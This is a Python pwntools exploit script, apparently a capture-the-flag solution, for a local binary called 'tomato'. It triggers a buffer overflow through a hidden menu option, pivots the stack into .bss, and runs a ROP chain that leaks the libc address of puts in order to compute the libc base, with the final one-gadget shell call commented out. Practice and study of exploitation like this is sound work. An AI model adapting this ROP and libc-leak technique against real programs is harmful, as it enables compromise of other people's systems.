from pwn import*
p = process('./tomato')
elf = ELF('./tomato')
libc = elf.libc

# gadget
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
read_plt = elf.plt['read']
bss = 0x602080+0x500
rlr_20 = 0x400D4C
rlr_50 = 0x400D1A
lr = 0x400D29
pop_rdi = 0x400fa3
pop_rsi = 0x400d84
pop_rdx = 0x400d82
one_list = [0x45216,0x4526a,0xf02a4,0xf1147]

# def
t = 0.1
def menu(sel):
	p.sendlineafter('> ',str(sel));sleep(t)

def buy(count,comment):
	menu(1)
	p.sendlineafter('> ',str(count));sleep(t)
	p.sendafter('You : ',comment);sleep(t)

def hidden(comment):
	menu(4)
	p.sendafter('explain : ',str(comment));sleep(t)

# hidden menu Jch
pay = ''
pay += 'a'*0x18
pay += p8(2)
buy(1,pay)

### stack pivot
# Rip Controll
pay = ''
pay += 'a'*0x20		# buf
pay += p64(bss+0x20)	# sfp
pay += p64(rlr_20)	# rip
hidden(pay)

# ROP Stage 1 : Expand Read_Leave_Ret Section
pay = ''
pay += p64(bss+0x300)	# sfp
pay += p64(pop_rsi)
pay += p64(bss+0x200)
pay += p64(rlr_50)
pay += 'b'*(0x20-len(pay))
pay += p64(bss)
pay += p64(lr)
p.send(pay);sleep(t)
# ROP stage 2 : Leak libc_puts addr
pay = ''
pay += 'x'*0x8
pay += p64(pop_rdi)
pay += p64(puts_got)
pay += p64(puts_plt)
pay += p64(pop_rdi)
pay += p64(0)
pay += p64(pop_rsi)
pay += p64(puts_got)
pay += p64(read_plt)
pay += p64(puts_plt)
pay += 'X'*(0x100-len(pay))
pay += p64(bss+0x200)	# sfp
pay += p64(lr)		# rip

p.sendline(pay);sleep(t)

# FINISH
p.recvuntil('GET OUT!\n')
p.recvuntil('GET OUT!\n')

libc_puts = u64(p.recv(6).ljust(8,'\x00'))
libc_base = libc_puts - libc.symbols['puts']
log.info("libc_puts : {}".format(hex(libc_puts)))
log.info("libc_base : {}".format(hex(libc_base)))

#p.sendline(p64(libc_base+one_list[0]))		# exploit !!!
p.sendline(p64(0x61616161))

p.interactive()

